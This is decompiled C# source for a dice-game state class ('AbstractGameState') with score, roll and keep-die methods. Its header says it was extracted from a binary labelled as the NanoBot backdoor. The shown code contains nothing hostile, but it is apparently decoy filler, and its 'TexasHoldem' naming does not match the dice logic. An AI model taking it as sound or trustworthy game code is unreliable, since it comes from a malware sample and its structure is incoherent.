// Decompiled with JetBrains decompiler
// Type: TexasHoldem.AbstractGameState
// Assembly: EventComm, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 230F04B0-E761-4388-A1F3-FE85FC156328
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\Backdoor.MSIL.NanoBot.bezt-158185cef899d67faabf1e968de02b3a8cbd0446c0fdf0e3579cb4533dd3768d.exe

using System.Collections.Generic;

namespace TexasHoldem
{
  public abstract class AbstractGameState
  {
    public virtual bool AcceptScore(
      GameManager game,
      ScoreCard scoreCard,
      ScoringCategory category,
      Dictionary<ScoringCategory, int> scores)
    {
      scoreCard.AcceptScore(category, scores[category]);
      game.NextState((AbstractGameState) new FirstMoveState());
      return true;
    }

    public virtual bool RollDice(GameManager game, DiceRoller roller)
    {
      roller.RollDice();
      switch (roller.RollsRemaining)
      {
        case 1:
          game.NextState((AbstractGameState) new ThirdMove());
          break;
        case 2:
          game.NextState((AbstractGameState) new SecondMoveState());
          break;
        default:
          game.NextState((AbstractGameState) new FinalMoveState());
          break;
      }
      return true;
    }

    public virtual bool SetWillKeep(GameManager game, DiceRoller roller, int die, bool keep)
    {
      roller.KeepDie(die, keep);
      return true;
    }
  }
}
